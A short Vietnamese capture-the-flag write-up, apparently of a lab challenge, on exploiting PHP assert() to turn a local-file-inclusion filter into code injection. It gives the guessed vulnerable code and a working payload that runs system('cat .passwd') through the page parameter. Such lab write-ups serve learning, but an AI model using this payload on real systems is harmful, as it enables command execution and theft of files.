Thử lỗi LFI: nhập vào URL `/?page=../` thì nó hiện ra thông báo:

>Warning: assert(): Assertion "strpos('includes/../.php', '..') ===  false" failed in /challenge/web-serveur/ch47/index.php on line 8 Detected hacking attempt!

Search gg PHP assert LFI vulnerability, đoán được đoạn code detect có dạng như sau:

```php
<?php
if (isset($_GET['page'])) {
    $page = $_GET['page'];
} else {
    $page = "home";
}
$file = "includes/" . $page . ".php";
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!"); 
?>
```

và biết thêm string truyền vào hàm assert()  được coi như php code, nghĩa là chúng ta có thể inject code sử dụng biến `$page`

Vậy payload sẽ có dạng như sau:

```php
','') or system('cat .passwd') ;//
```

khi đó câu lệnh trở thành:

```php
assert("strpos(' includes/','') or system('cat .passwd') ;//.php', '..') === false") or die("Detected hacking attempt!"); 
```

và nó sẽ in ra file .passwd cho mình

